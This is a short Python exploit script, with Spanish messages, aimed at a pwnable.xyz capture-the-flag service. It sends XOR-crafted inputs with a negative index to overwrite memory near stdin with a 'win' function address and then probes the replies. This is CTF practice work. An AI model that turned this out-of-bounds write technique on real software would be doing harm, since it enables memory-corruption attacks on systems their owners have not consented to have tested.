#!/usr/bin/env python3
import socket
import time

host = "svc.pwnable.xyz"
port = 30029

print("Conectando...")
time.sleep(5)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(30)
s.connect((host, port))

banner = s.recv(1024)
print(banner.decode())

win = 0xa21
result_base = 0x202200

print(f"\nPrueba 1: Sobrescribir SOLO offset -5 (stdin+216) con win...")
b = 0x555555555555
a = win ^ b
s.sendall(f"{a} {b} -5\n".encode())
time.sleep(0.5)

try:
    resp = s.recv(2048)
    print(f"Resp: {resp.decode()}")
except Exception as e:
    print(f"Error: {e}")

print("\nIntentando más inputs...")
for i in range(3):
    s.sendall(f"{i+1} {i+2} {i+2}\n".encode())
    time.sleep(0.3)
    try:
        resp = s.recv(2048)
        print(f"  {i+1}: {resp.decode().strip()[:50]}")
    except:
        print(f"  {i+1}: error")

print("\nPrueba 2: Sobrescribir offset -5 con result_base...")
b = 0x777777777777
a = result_base ^ b
s.sendall(f"{a} {b} -5\n".encode())
time.sleep(0.5)

try:
    resp = s.recv(2048)
    print(f"Resp: {resp.decode()}")
except Exception as e:
    print(f"Error: {e}")

print("\nMás inputs...")
for i in range(3):
    s.sendall(f"{i+10} {i+20} {i+3}\n".encode())
    time.sleep(0.3)
    try:
        resp = s.recv(2048)
        print(f"  {i+1}: {resp.decode().strip()[:50]}")
    except:
        print(f"  {i+1}: error")

s.close()
print("\nFin")